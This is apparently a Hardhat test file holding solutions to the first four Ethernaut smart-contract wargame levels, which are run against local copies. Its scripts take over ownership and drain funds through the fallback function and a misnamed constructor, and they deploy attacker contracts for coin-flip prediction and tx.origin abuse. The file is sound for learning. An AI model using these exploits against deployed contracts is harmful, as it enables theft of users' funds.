const { expect } = require("chai");
const { ethers,waffle } = require("hardhat");

describe("Ethernaut ", function () {

  before(async () => {
    [account1, account2] = await ethers.getSigners();
    });

  it.skip("1.Fallback", async function () {
    const Contract = await ethers.getContractFactory("Fallback");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //call contribute function
    await contract.connect(account2).contribute({value: '100000000000000'});

    //check that the contract has balance
    console.log("Balance of the contract before attack:", (await provider.getBalance(contract.address)).toString());
    //create a tx to send ether to the contract
    tx = {
      to: contract.address,
      value: '100000000000000'
    }

    //send ether to the contract and steal ownership
    await account2.sendTransaction({to: contract.address,value: '100000000000000'});

    //check ownership
    expect(await contract.owner()).to.be.equal(account2.address);

    //withdraw the funds
    await contract.connect(account2).withdraw();

    //check that the contract has no balance
    console.log("Balance of the contract after attack:", (await provider.getBalance(contract.address)).toString());
  });

  it.skip("2.Fallout", async function () {
    const Contract = await ethers.getContractFactory("Fallout");
    const contract = await Contract.deploy();
    await contract.deployed();

    const provider = waffle.provider;

    //check owner (the contract shuldnt have owner)
    expect(await contract.owner()).to.be.equal('0x0000000000000000000000000000000000000000');

    //steal ownership
    await contract.connect(account2).Fal1out();

    //check if the ownership changes
    expect(await contract.owner()).to.be.equal(account2.address);
  });

  it.skip("3.Coin Flip", async function () {
    const Contract = await ethers.getContractFactory("CoinFlip");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("CoinFlipAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    for(let i=0 ; i<10 ; i++){
      await attacker.attack();
    }

    console.log("aciertos: ",(await contract.consecutiveWins()).toString())
  });

  it("4.Telephone", async function () {
    const Contract = await ethers.getContractFactory("Telephone");
    const contract = await Contract.deploy();
    await contract.deployed();

    const Attacker = await ethers.getContractFactory("TelephoneAttacker");
    const attacker = await Attacker.deploy(contract.address);
    await attacker.deployed();

    const provider = waffle.provider;

    console.log("Owner before the attack: ", await contract.owner());
    await attacker.attack();
    console.log("Owner after the attack: ", await contract.owner());
  });
});
